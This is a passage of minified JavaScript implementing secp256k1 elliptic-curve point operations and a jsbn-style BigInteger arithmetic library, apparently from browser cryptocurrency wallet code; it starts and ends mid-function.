    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.multiplyTwo = function(e, t, o) {
    var r = e.bitLength() > o.bitLength() ? e.bitLength() - 1 : o.bitLength() - 1;
    for (var s = this.curve.getInfinity(), n = this.add(t); 0 <= r;) s = s.twice(), e.testBit(r) ? s = s.add(o.testBit(r) ? n : this) : o.testBit(r) && (s = s.add(t)), --r;
    return s
  }, e.PointFp.prototype.getEncoded = function(t) {
    var o = this.getX().toBigInteger(),
      i = this.getY().toBigInteger(),
      r = e.integerToBytes(o, 32);
    return t ? r.unshift(i.isEven() ? 2 : 3) : (r.unshift(4), r = r.concat(e.integerToBytes(i, 32))), r
  }, e.PointFp.decodeFrom = function(t, o) {
    var i = (o[0], o.length - 1),
      r = o.slice(1, 1 + i / 2),
      s = o.slice(1 + i / 2, 1 + i);
    r.unshift(0), s.unshift(0);
    var n = new BigInteger(r),
      p = new BigInteger(s);
    return new e.PointFp(t, t.fromBigInteger(n), t.fromBigInteger(p))
  }, e.PointFp.prototype.add2D = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    if (this.x.equals(t.x)) return this.y.equals(t.y) ? this.twice() : this.curve.getInfinity();
    var o = t.x.subtract(this.x),
      i = t.y.subtract(this.y),
      r = i.divide(o),
      s = r.square().subtract(this.x).subtract(t.x),
      n = r.multiply(this.x.subtract(s)).subtract(this.y);
    return new e.PointFp(this.curve, s, n)
  }, e.PointFp.prototype.twice2D = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = this.curve.fromBigInteger(BigInteger.valueOf(2)),
      o = this.curve.fromBigInteger(BigInteger.valueOf(3)),
      i = this.x.square().multiply(o).add(this.curve.a).divide(this.y.multiply(t)),
      r = i.square().subtract(this.x.multiply(t)),
      s = i.multiply(this.x.subtract(r)).subtract(this.y);
    return new e.PointFp(this.curve, r, s)
  }, e.PointFp.prototype.multiply2D = function(t) {
    if (this.isInfinity()) return this;
    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add2D(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.isOnCurve = function() {
    var e = this.getX().toBigInteger(),
      t = this.getY().toBigInteger(),
      o = this.curve.getA().toBigInteger(),
      i = this.curve.getB().toBigInteger(),
      r = this.curve.getQ(),
      s = t.multiply(t).mod(r),
      n = e.multiply(e).multiply(e).add(o.multiply(e)).add(i).mod(r);
    return s.equals(n)
  }, e.PointFp.prototype.toString = function() {
    return "(" + this.getX().toBigInteger().toString() + "," + this.getY().toBigInteger().toString() + ")"
  }, e.PointFp.prototype.validate = function() {
    var e = this.curve.getQ();
    if (this.isInfinity()) throw new Error("Point is at infinity.");
    var t = this.getX().toBigInteger(),
      o = this.getY().toBigInteger();
    if (0 > t.compareTo(BigInteger.ONE) || 0 < t.compareTo(e.subtract(BigInteger.ONE))) throw new Error("x coordinate out of bounds");
    if (0 > o.compareTo(BigInteger.ONE) || 0 < o.compareTo(e.subtract(BigInteger.ONE))) throw new Error("y coordinate out of bounds");
    if (!this.isOnCurve()) throw new Error("Point is not on the curve.");
    if (this.multiply(e).isInfinity()) throw new Error("Point is not a scalar multiple of G.");
    return !0
  }, e.CurveFp = function(t, o, i) {
    this.q = t, this.a = this.fromBigInteger(o), this.b = this.fromBigInteger(i), this.infinity = new e.PointFp(this, null, null), this.reducer = new Barrett(this.q)
  }, e.CurveFp.prototype.getQ = function() {
    return this.q
  }, e.CurveFp.prototype.getA = function() {
    return this.a
  }, e.CurveFp.prototype.getB = function() {
    return this.b
  }, e.CurveFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.a.equals(e.a) && this.b.equals(e.b)
  }, e.CurveFp.prototype.getInfinity = function() {
    return this.infinity
  }, e.CurveFp.prototype.fromBigInteger = function(t) {
    return new e.FieldElementFp(this.q, t)
  }, e.CurveFp.prototype.reduce = function(e) {
    this.reducer.reduce(e)
  }, e.CurveFp.prototype.decodePointHex = function(t) {
    var o = parseInt(t.substr(0, 2), 16);
    switch (o) {
      case 0:
        return this.infinity;
      case 2:
      case 3:
        var i = t.substr(2, t.length - 2),
          r = new BigInteger(i, 16);
        return this.decompressPoint(1 & o, r);
      case 4:
      case 6:
      case 7:
        var s = (t.length - 2) / 2,
          i = t.substr(2, s),
          n = t.substr(s + 2, s);
        return new e.PointFp(this, this.fromBigInteger(new BigInteger(i, 16)), this.fromBigInteger(new BigInteger(n, 16)));
      default:
        return null;
    }
  }, e.CurveFp.prototype.encodePointHex = function(e) {
    if (e.isInfinity()) return "00";
    var t = e.getX().toBigInteger().toString(16),
      i = e.getY().toBigInteger().toString(16),
      r = this.getQ().toString(16).length;
    for (0 != r % 2 && r++; t.length < r;) t = "0" + t;
    for (; i.length < r;) i = "0" + i;
    return "04" + t + i
  }, e.CurveFp.prototype.decompressPoint = function(t, o) {
    var i = this.fromBigInteger(o),
      r = i.multiply(i.square().add(this.getA())).add(this.getB()),
      s = r.sqrt();
    if (null == s) throw new Error("Invalid point compression");
    var n = s.toBigInteger(),
      p = n.testBit(0) ? 1 : 0;
    return p != t && (s = this.fromBigInteger(this.getQ().subtract(n))), new e.PointFp(this, i, s, null, !0)
  }, e.fromHex = function(e) {
    return new BigInteger(e, 16)
  }, e.integerToBytes = function(e, t) {
    var o = e.toByteArrayUnsigned();
    if (t < o.length) o = o.slice(o.length - t);
    else
      for (; t > o.length;) o.unshift(0);
    return o
  }, e.X9Parameters = function(e, t, o, i) {
    this.curve = e, this.g = t, this.n = o, this.h = i
  }, e.X9Parameters.prototype.getCurve = function() {
    return this.curve
  }, e.X9Parameters.prototype.getG = function() {
    return this.g
  }, e.X9Parameters.prototype.getN = function() {
    return this.n
  }, e.X9Parameters.prototype.getH = function() {
    return this.h
  }, e.secNamedCurves = {
    secp256k1: function() {
      var t = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F"),
        o = BigInteger.ZERO,
        i = e.fromHex("7"),
        r = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"),
        s = BigInteger.ONE,
        n = new e.CurveFp(t, o, i),
        p = n.decodePointHex("0479BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8");
      return new e.X9Parameters(n, p, r, s)
    }
  }, e.getSECCurveByName = function(t) {
    return null == e.secNamedCurves[t] ? null : e.secNamedCurves[t]()
  }
}(),
function() {
  function s() {
    return new h(null)
  }

  function e(e, t, o, r, s, p) {
    for (; 0 <= --p;) {
      var a = t * this[e++] + o[r] + s;
      s = Math.floor(a / 67108864), o[r++] = 67108863 & a
    }
    return s
  }

  function t(e, t, o, r, s, p) {
    for (var a = 32767 & t, d = t >> 15; 0 <= --p;) {
      var u = 32767 & this[e],
        y = this[e++] >> 15,
        g = d * u + y * a;
      u = a * u + ((32767 & g) << 15) + o[r] + (1073741823 & s), s = (u >>> 30) + (g >>> 15) + d * y + (s >>> 30), o[r++] = 1073741823 & u
    }
    return s
  }

  function o(e, t, o, r, s, p) {
    for (var a = 16383 & t, d = t >> 14; 0 <= --p;) {
      var u = 16383 & this[e],
        y = this[e++] >> 14,
        g = d * u + y * a;
      u = a * u + ((16383 & g) << 14) + o[r] + s, s = (u >> 28) + (g >> 14) + d * y, o[r++] = 268435455 & u
    }
    return s
  }

  function r(e) {
    return b.charAt(e)
  }

  function n(e, t) {
    var o = B[e.charCodeAt(t)];
    return null == o ? -1 : o
  }

  function p(e) {
    var t = s();
    return t.fromInt(e), t
  }

  function a(e) {
    var i, s = 1;
    return 0 != (i = e >>> 16) && (e = i, s += 16), 0 != (i = e >> 8) && (e = i, s += 8), 0 != (i = e >> 4) && (e = i, s += 4), 0 != (i = e >> 2) && (e = i, s += 2), 0 != (i = e >> 1) && (e = i, s += 1), s
  }

  function d(e) {
    if (0 == e) return -1;
    var t = 0;
    return 0 == (65535 & e) && (e >>= 16, t += 16), 0 == (255 & e) && (e >>= 8, t += 8), 0 == (15 & e) && (e >>= 4, t += 4), 0 == (3 & e) && (e >>= 2, t += 2), 0 == (1 & e) && ++t, t
  }

  function l(e) {
    for (var t = 0; 0 != e;) e &= e - 1, ++t;
    return t
  }

  function i(e, t) {
    return e & t
  }

  function u(e, t) {
    return e | t
  }

  function y(e, t) {
    return e ^ t
  }

  function c(e, t) {
    return e & ~t
  }
  var m, h = window.BigInteger = function e(t, o, i) {
    return this instanceof e ? void(null != t && ("number" == typeof t ? this.fromNumber(t, o, i) : null == o && "string" != typeof t ? this.fromString(t, 256) : this.fromString(t, o))) : new e(t, o, i)
  };
  "Microsoft Internet Explorer" == navigator.appName ? (h.prototype.am = t, m = 30) : "Netscape" != navigator.appName ? (h.prototype.am = e, m = 26) : (h.prototype.am = o, m = 28), h.prototype.DB = m, h.prototype.DM = (1 << m) - 1, h.prototype.DV = 1 << m;
  h.prototype.FV = Math.pow(2, 52), h.prototype.F1 = 52 - m, h.prototype.F2 = 2 * m - 52;
  var g, f, b = "0123456789abcdefghijklmnopqrstuvwxyz",
    B = [];
  for (g = 48, f = 0; 9 >= f; ++f) B[g++] = f;
  for (g = 97, f = 10; 36 > f; ++f) B[g++] = f;
  for (g = 65, f = 10; 36 > f; ++f) B[g++] = f;
  h.prototype.copyTo = function(e) {
    for (var t = this.t - 1; 0 <= t; --t) e[t] = this[t];
    e.t = this.t, e.s = this.s
  }, h.prototype.fromInt = function(e) {
    this.t = 1, this.s = 0 > e ? -1 : 0, 0 < e ? this[0] = e : -1 > e ? this[0] = e + this.DV : this.t = 0
  }, h.prototype.fromString = function(e, t) {
    var o;
    if (16 == t) o = 4;
    else if (8 == t) o = 3;
    else if (256 == t) o = 8;
    else if (2 == t) o = 1;
    else if (32 == t) o = 5;
    else {
      if (4 != t) return void this.fromRadix(e, t);
      o = 2
    }
    this.t = 0, this.s = 0;
    for (var r, s = e.length, p = !1, a = 0; 0 <= --s;) r = 8 == o ? 255 & e[s] : n(e, s), 0 > r ? "-" == e.charAt(s) && (p = !0) : (p = !1, 0 == a ? this[this.t++] = r : a + o > this.DB ? (this[this.t - 1] |= (r & (1 << this.DB - a) - 1) << a, this[this.t++] = r >> this.DB - a) : this[this.t - 1] |= r << a, a += o, a >= this.DB && (a -= this.DB));
    8 == o && 0 != (128 & e[0]) && (this.s = -1, 0 < a && (this[this.t - 1] |= (1 << this.DB - a) - 1 << a)), this.clamp(), p && h.ZERO.subTo(this, this)
  }, h.prototype.clamp = function() {
    for (var e = this.s & this.DM; 0 < this.t && this[this.t - 1] == e;) --this.t
  }, h.prototype.dlShiftTo = function(e, t) {
    var o;
    for (o = this.t - 1; 0 <= o; --o) t[o + e] = this[o];
    for (o = e - 1; 0 <= o; --o) t[o] = 0;
    t.t = this.t + e, t.s = this.s
  }, h.prototype.drShiftTo = function(e, t) {
    for (var o = e; o < this.t; ++o) t[o - e] = this[o];
    t.t = Math.max(this.t - e, 0), t.s = this.s
  }, h.prototype.lShiftTo = function(e, t) {
    var r, s = e % this.DB,
      o = this.DB - s,
      n = Math.floor(e / this.DB),
      p = this.s << s & this.DM;
    for (r = this.t - 1; 0 <= r; --r) t[r + n + 1] = this[r] >> o | p, p = (this[r] & (1 << o) - 1) << s;
    for (r = n - 1; 0 <= r; --r) t[r] = 0;
    t[n] = p, t.t = this.t + n + 1, t.s = this.s, t.clamp()
  }, h.prototype.rShiftTo = function(e, t) {
    t.s = this.s;
    var r = Math.floor(e / this.DB);
    if (r >= this.t) return void(t.t = 0);
    var o = e % this.DB,
      s = this.DB - o,
      n = (1 << o) - 1;
    t[0] = this[r] >> o;
    for (var p = r + 1; p < this.t; ++p) t[p - r - 1] |= (this[p] & n) << s, t[p - r] = this[p] >> o;
    0 < o && (t[this.t - r - 1] |= (this.s & n) << s), t.t = this.t - r, t.clamp()
  }, h.prototype.subTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] - e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r -= e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r -= e[o], t[o++] = r & this.DM, r >>= this.DB;
      r -= e.s
    }
    t.s = 0 > r ? -1 : 0, -1 > r ? t[o++] = this.DV + r : 0 < r && (t[o++] = r), t.t = o, t.clamp()
  }, h.prototype.multiplyTo = function(e, t) {
    var r = this.abs(),
      o = e.abs(),
      s = r.t;
    for (t.t = s + o.t; 0 <= --s;) t[s] = 0;
    for (s = 0; s < o.t; ++s) t[s + r.t] = r.am(0, o[s], t, s, 0, r.t);
    t.s = 0, t.clamp(), this.s != e.s && h.ZERO.subTo(t, t)
  }, h.prototype.squareTo = function(e) {
    for (var t = this.abs(), o = e.t = 2 * t.t; 0 <= --o;) e[o] = 0;
    for (o = 0; o < t.t - 1; ++o) {
      var r = t.am(o, t[o], e, 2 * o, 0, 1);
      (e[o + t.t] += t.am(o + 1, 2 * t[o], e, 2 * o + 1, r, t.t - o - 1)) >= t.DV && (e[o + t.t] -= t.DV, e[o + t.t + 1] = 1)
    }
    0 < e.t && (e[e.t - 1] += t.am(o, t[o], e, 2 * o, 0, 1)), e.s = 0, e.clamp()
  }, h.prototype.divRemTo = function(o, n, p) {
    var l = o.abs();
    if (!(0 >= l.t)) {
      var u = this.abs();
      if (u.t < l.t) return null != n && n.fromInt(0), void(null != p && this.copyTo(p));
      null == p && (p = s());
      var c = s(),
        d = this.s,
        y = o.s,
        m = this.DB - a(l[l.t - 1]);
      0 < m ? (l.lShiftTo(m, c), u.lShiftTo(m, p)) : (l.copyTo(c), u.copyTo(p));
      var g = c.t,
        f = c[g - 1];
      if (0 != f) {
        var b = f * (1 << this.F1) + (1 < g ? c[g - 2] >> this.F2 : 0),
          B = this.FV / b,
          F = (1 << this.F1) / b,
          T = 1 << this.F2,
          e = p.t,
          v = e - g,
          C = null == n ? s() : n;
        for (c.dlShiftTo(v, C), 0 <= p.compareTo(C) && (p[p.t++] = 1, p.subTo(C, p)), h.ONE.dlShiftTo(g, C), C.subTo(c, c); c.t < g;) c[c.t++] = 0;
        for (; 0 <= --v;) {
          var t = p[--e] == f ? this.DM : Math.floor(p[e] * B + (p[e - 1] + T) * F);
          if ((p[e] += c.am(0, t, p, v, 0, g)) < t)
            for (c.dlShiftTo(v, C), p.subTo(C, p); p[e] < --t;) p.subTo(C, p)
        }
        null != n && (p.drShiftTo(g, n), d != y && h.ZERO.subTo(n, n)), p.t = g, p.clamp(), 0 < m && p.rShiftTo(m, p), 0 > d && h.ZERO.subTo(p, p)
      }
    }
  }, h.prototype.invDigit = function() {
    if (1 > this.t) return 0;
    var e = this[0];
    if (0 == (1 & e)) return 0;
    var t = 3 & e;
    return t = 15 & t * (2 - (15 & e) * t), t = 255 & t * (2 - (255 & e) * t), t = 65535 & t * (2 - (65535 & (65535 & e) * t)), t = t * (2 - e * t % this.DV) % this.DV, 0 < t ? this.DV - t : -t
  }, h.prototype.isEven = function() {
    return 0 == (0 < this.t ? 1 & this[0] : this.s)
  }, h.prototype.exp = function(o, e) {
    if (4294967295 < o || 1 > o) return h.ONE;
    var n = s(),
      p = s(),
      d = e.convert(this),
      l = a(o) - 1;
    for (d.copyTo(n); 0 <= --l;)
      if (e.sqrTo(n, p), 0 < (o & 1 << l)) e.mulTo(p, d, n);
      else {
        var u = n;
        n = p, p = u
      } return e.revert(n)
  }, h.prototype.toString = function(e) {
    if (0 > this.s) return "-" + this.negate().toString(e);
    var t;
    if (16 == e) t = 4;
    else if (8 == e) t = 3;
    else if (2 == e) t = 1;
    else if (32 == e) t = 5;
    else {
      if (4 != e) return this.toRadix(e);
      t = 2
    }
    var o, s = (1 << t) - 1,
      n = !1,
      a = "",
      d = this.t,
      l = this.DB - d * this.DB % t;
    if (0 < d--)
      for (l < this.DB && 0 < (o = this[d] >> l) && (n = !0, a = r(o)); 0 <= d;) t > l ? (o = (this[d] & (1 << l) - 1) << t - l, o |= this[--d] >> (l += this.DB - t)) : (o = this[d] >> (l -= t) & s, 0 >= l && (l += this.DB, --d)), 0 < o && (n = !0), n && (a += r(o));
    return n ? a : "0"
  }, h.prototype.negate = function() {
    var e = s();
    return h.ZERO.subTo(this, e), e
  }, h.prototype.abs = function() {
    return 0 > this.s ? this.negate() : this
  }, h.prototype.compareTo = function(e) {
    var t = this.s - e.s;
    if (0 != t) return t;
    var o = this.t;
    if (t = o - e.t, 0 != t) return 0 > this.s ? -t : t;
    for (; 0 <= --o;)
      if (0 != (t = this[o] - e[o])) return t;
    return 0
  }, h.prototype.bitLength = function() {
    return 0 >= this.t ? 0 : this.DB * (this.t - 1) + a(this[this.t - 1] ^ this.s & this.DM)
  }, h.prototype.mod = function(e) {
    var t = s();
    return this.abs().divRemTo(e, null, t), 0 > this.s && 0 < t.compareTo(h.ZERO) && e.subTo(t, t), t
  }, h.prototype.modPowInt = function(t, e) {
    var i;
    return i = 256 > t || e.isEven() ? new S(e) : new A(e), this.exp(t, i)
  }, h.ZERO = p(0), h.ONE = p(1);
  var F = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997],
    T = 67108864 / F[F.length - 1];
  h.prototype.chunkSize = function(e) {
    return Math.floor(Math.LN2 * this.DB / Math.log(e))
  }, h.prototype.toRadix = function(e) {
    if (null == e && (e = 10), 0 == this.signum() || 2 > e || 36 < e) return "0";
    var t = this.chunkSize(e),
      o = Math.pow(e, t),
      i = p(o),
      n = s(),
      a = s(),
      d = "";
    for (this.divRemTo(i, n, a); 0 < n.signum();) d = (o + a.intValue()).toString(e).substr(1) + d, n.divRemTo(i, n, a);
    return a.intValue().toString(e) + d
  }, h.prototype.fromRadix = function(e, t) {
    this.fromInt(0), null == t && (t = 10);
    for (var r, s = this.chunkSize(t), p = Math.pow(t, s), a = !1, l = 0, u = 0, c = 0; c < e.length; ++c) r = n(e, c), 0 > r ? "-" == e.charAt(c) && 0 == this.signum() && (a = !0) : (u = t * u + r, ++l >= s && (this.dMultiply(p), this.dAddOffset(u, 0), l = 0, u = 0));
    0 < l && (this.dMultiply(Math.pow(t, l)), this.dAddOffset(u, 0)), a && h.ZERO.subTo(this, this)
  }, h.prototype.fromNumber = function(e, i, o) {
    if (!("number" == typeof i)) {
      var r = [],
        s = 7 & e;
      r.length = (e >> 3) + 1, i.nextBytes(r), 0 < s ? r[0] &= (1 << s) - 1 : r[0] = 0, this.fromString(r, 256)
    } else if (2 > e) this.fromInt(1);
    else
      for (this.fromNumber(e, o), this.testBit(e - 1) || this.bitwiseTo(h.ONE.shiftLeft(e - 1), u, this), this.isEven() && this.dAddOffset(1, 0); !this.isProbablePrime(i);) this.dAddOffset(2, 0), this.bitLength() > e && this.subTo(h.ONE.shiftLeft(e - 1), this)
  }, h.prototype.bitwiseTo = function(e, t, o) {
    var r, s, n = Math.min(e.t, this.t);
    for (r = 0; n > r; ++r) o[r] = t(this[r], e[r]);
    if (e.t < this.t) {
      for (s = e.s & this.DM, r = n; r < this.t; ++r) o[r] = t(this[r], s);
      o.t = this.t
    } else {
      for (s = this.s & this.DM, r = n; r < e.t; ++r) o[r] = t(s, e[r]);
      o.t = e.t
    }
    o.s = t(this.s, e.s), o.clamp()
  }, h.prototype.changeBit = function(e, t) {
    var o = h.ONE.shiftLeft(e);
    return this.bitwiseTo(o, t, o), o
  }, h.prototype.addTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] + e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r += e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r += e[o], t[o++] = r & this.DM, r >>= this.DB;
      r += e.s
    }
    t.s = 0 > r ? -1 : 0, 0 < r ? t[o++] = r : -1 > r && (t[o++] = this.DV + r), t.t = o, t.clamp()
  }, h.prototype.dMultiply = function(e) {
    this[this.t] = this.am(0, e - 1, this, 0, 0, this.t), ++this.t, this.clamp()
  }, h.prototype.dAddOffset = function(e, t) {
    if (0 != e) {
      for (; this.t <= t;) this[this.t++] = 0;
      for (this[t] += e; this[t] >= this.DV;) this[t] -= this.DV, ++t >= this.t && (this[this.t++] = 0), ++this[t]
    }
  }, h.prototype.multiplyLowerTo = function(e, t, s) {
    var r = Math.min(this.t + e.t, t);
    for (s.s = 0, s.t = r; 0 < r;) s[--r] = 0;
    var n;
    for (n = s.t - this.t; n > r; ++r) s[r + this.t] = this.am(0, e[r], s, r, 0, this.t);
    for (n = Math.min(e.t, t); n > r; ++r) this.am(0, e[r], s, r, 0, t - r);
    s.clamp()
  }, h.prototype.multiplyUpperTo = function(e, t, o) {
    --t;
    var r = o.t = this.t + e.t - t;
    for (o.s = 0; 0 <= --r;) o[r] = 0;
    for (r = Math.max(t - this.t, 0); r < e.t; ++r) o[this.t + r - t] = this.am(t - r, e[r], o, 0, 0, this.t + r - t);
    o.clamp(), o.drShiftTo(1, o)
  }, h.prototype.modInt = function(e) {
    if (0 >= e) return 0;
    var t = this.DV % e,
      o = 0 > this.s ? e - 1 : 0;
    if (0 < this.t)
      if (0 == t) o = this[0] % e;
      else
        for (var s = this.t - 1; 0 <= s; --s) o = (t * o + this[s]) % e;
    return o
  }, h.prototype.millerRabin = function(e) {
    var o = this.subtract(h.ONE),
      n = o.getLowestSetBit();
    if (0 >= n) return !1;
    var p = o.shiftRight(n);
    e = e + 1 >> 1, e > F.length && (e = F.length);
    for (var r = s(), a = 0; e > a; ++a) {
      r.fromInt(F[Math.floor(Math.random() * F.length)]);
      var l = r.modPow(p, this);
      if (0 != l.compareTo(h.ONE) && 0 != l.compareTo(o)) {
        for (var u = 1; u++ < n && 0 != l.compareTo(o);)
          if (l = l.modPowInt(2, this), 0 == l.compareTo(h.ONE)) return !1;
        if (0 != l.compareTo(o)) return !1
      }
    }
    return !0
  }, h.prototype.clone = function() {
    var e = s();
    return this.copyTo(e), e
  }, h.prototype.intValue = function() {
    if (0 > this.s) {
      if (1 == this.t) return this[0] - this.DV;
      if (0 == this.t) return -1
    } else {
      if (1 == this.t) return this[0];
      if (0 == this.t) return 0
    }
    return (this[1] & (1 << 32 - this.DB) - 1) << this.DB | this[0]
  }, h.prototype.byteValue = function() {
    return 0 == this.t ? this.s : this[0] << 24 >> 24
  }, h.prototype.shortValue = function() {
    return 0 == this.t ? this.s : this[0] << 16 >> 16
  }, h.prototype.signum = function() {
    return 0 > this.s ? -1 : 0 >= this.t || 1 == this.t && 0 >= this[0] ? 0 : 1
  }, h.prototype.toByteArray = function() {
    var e = this.t,
      t = [];
    t[0] = this.s;
    var r, s = this.DB - e * this.DB % 8,
      n = 0;
    if (0 < e--)
      for (s < this.DB && (r = this[e] >> s) != (this.s & this.DM) >> s && (t[n++] = r | this.s << this.DB - s); 0 <= e;) 8 > s ? (r = (this[e] & (1 << s) - 1) << 8 - s, r |= this[--e] >> (s += this.DB - 8)) : (r = 255 & this[e] >> (s -= 8), 0 >= s && (s += this.DB, --e)), 0 != (128 & r) && (r |= -256), 0 == n && (128 & this.s) != (128 & r) && ++n, (0 < n || r != this.s) && (t[n++] = r);
    return t
  }, h.prototype.equals = function(e) {
    return 0 == this.compareTo(e)
  }, h.prototype.min = function(e) {
    return 0 > this.compareTo(e) ? this : e
  }, h.prototype.max = function(e) {
    return 0 < this.compareTo(e) ? this : e
  }, h.prototype.and = function(e) {
    var t = s();
    return this.bitwiseTo(e, i, t), t
  }, h.prototype.or = function(e) {
    var t = s();
    return this.bitwiseTo(e, u, t), t
  }, h.prototype.xor = function(e) {
    var t = s();
    return this.bitwiseTo(e, y, t), t
  }, h.prototype.andNot = function(e) {
    var t = s();
    return this.bitwiseTo(e, c, t), t
  }, h.prototype.not = function() {
    for (var e = s(), t = 0; t < this.t; ++t) e[t] = this.DM & ~this[t];
    return e.t = this.t, e.s = ~this.s, e
  }, h.prototype.shiftLeft = function(e) {
    var t = s();
    return 0 > e ? this.rShiftTo(-e, t) : this.lShiftTo(e, t), t
  }, h.prototype.shiftRight = function(e) {
    var t = s();
    return 0 > e ? this.lShiftTo(-e, t) : this.rShiftTo(e, t), t
  }, h.prototype.getLowestSetBit = function() {
    for (var e = 0; e < this.t; ++e)
      if (0 != this[e]) return e * this.DB + d(this[e]);
    return 0 > this.s ? this.t * this.DB : -1
  }, h.prototype.bitCount = function() {
    for (var e = 0, t = this.s & this.DM, o = 0; o < this.t; ++o) e += l(this[o] ^ t);
    return e
  }, h.prototype.testBit = function(e) {
    var t = Math.floor(e / this.DB);
    return t >= this.t ? 0 != this.s : 0 != (this[t] & 1 << e % this.DB)
  }, h.prototype.setBit = function(e) {
    return this.changeBit(e, u)
  }, h.prototype.clearBit = function(e) {
    return this.changeBit(e, c)
  }, h.prototype.flipBit = function(e) {
    return this.changeBit(e, y)
  }, h.prototype.add = function(e) {
    var t = s();
    return this.addTo(e, t), t
  }, h.prototype.subtract = function(e) {
    var t = s();
    return this.subTo(e, t), t
  }, h.prototype.multiply = function(e) {
    var t = s();
    return this.multiplyTo(e, t), t
  }, h.prototype.divide = function(e) {
    var t = s();
    return this.divRemTo(e, t, null), t
  }, h.prototype.remainder = function(e) {
    var t = s();
    return this.divRemTo(e, null, t), t
  }, h.prototype.divideAndRemainder = function(e) {
    var t = s(),
      o = s();
    return this.divRemTo(e, t, o), [t, o]
  }, h.prototype.modPow = function(o, e) {
    var l, c, m = o.bitLength(),
      h = p(1);
    if (0 >= m) return h;
    l = 18 > m ? 1 : 48 > m ? 3 : 144 > m ? 4 : 768 > m ? 5 : 6, c = 8 > m ? new S(e) : e.isEven() ? new E(e) : new A(e);
    var b = [],
      g = 3,
      B = l - 1,
      d = (1 << l) - 1;
    if (b[1] = c.convert(this), 1 < l) {
      var y = s();
      for (c.sqrTo(b[1], y); d >= g;) b[g] = s(), c.mulTo(y, b[g - 2], b[g]), g += 2
    }
    var v, P, w = o.t - 1,
      x = !0,
      D = s();
    for (m = a(o[w]) - 1; 0 <= w;) {
      for (m >= B ? v = o[w] >> m - B & d : (v = (o[w] & (1 << m + 1) - 1) << B - m, 0 < w && (v |= o[w - 1] >> this.DB + m - B)), g = l; 0 == (1 & v);) v >>= 1, --g;
      if (0 > (m -= g) && (m += this.DB, --w), x) b[v].copyTo(h), x = !1;
      else {
        for (; 1 < g;) c.sqrTo(h, D), c.sqrTo(D, h), g -= 2;
        0 < g ? c.sqrTo(h, D) : (P = h, h = D, D = P), c.mulTo(D, b[v], h)
      }
      for (; 0 <= w && 0 == (o[w] & 1 << m);) c.sqrTo(h, D), P = h, h = D, D = P, 0 > --m && (m = this.DB - 1, --w)
    }
    return c.revert(h)
  }, h.prototype.modInverse = function(e) {
    var t = e.isEven();
    if (0 === this.signum()) throw new Error("division by zero");
    if (this.isEven() && t || 0 == e.signum()) return h.ZERO;
    for (var o = e.clone(), i = this.clone(), r = p(1), s = p(0), n = p(0), a = p(1); 0 != o.signum();) {
      for (; o.isEven();) o.rShiftTo(1, o), t ? (r.isEven() && s.isEven() || (r.addTo(this, r), s.subTo(e, s)), r.rShiftTo(1, r)) : s.isEven() || s.subTo(e, s), s.rShiftTo(1, s);
      for (; i.isEven();) i.rShiftTo(1, i), t ? (n.isEven() && a.isEven() || (n.addTo(this, n), a.subTo(e, a)), n.rShiftTo(1, n)) : a.isEven() || a.subTo(e, a), a.rShiftTo(1, a);
      0 <= o.compareTo(i) ? (o.subTo(i, o), t && r.subTo(n, r), s.subTo(a, s)) : (i.subTo(o, i), t && n.subTo(r, n), a.subTo(s, a))
    }
    if (0 != i.compareTo(h.ONE)) return h.ZERO;
    for (; 0 <= a.compareTo(e);) a.subTo(e, a);
    for (; 0 > a.signum();) a.addTo(e, a);
    return a
  }, h.prototype.pow = function(t) {
    return this.exp(t, new v)
  }, h.prototype.gcd = function(e) {
    var r = 0 > this.s ? this.negate() : this.clone(),
      s = 0 > e.s ? e.negate() : e.clone();
    if (0 > r.compareTo(s)) {
      var n = r;
      r = s, s = n
    }
    var t = r.getLowestSetBit(),
      p = s.getLowestSetBit();
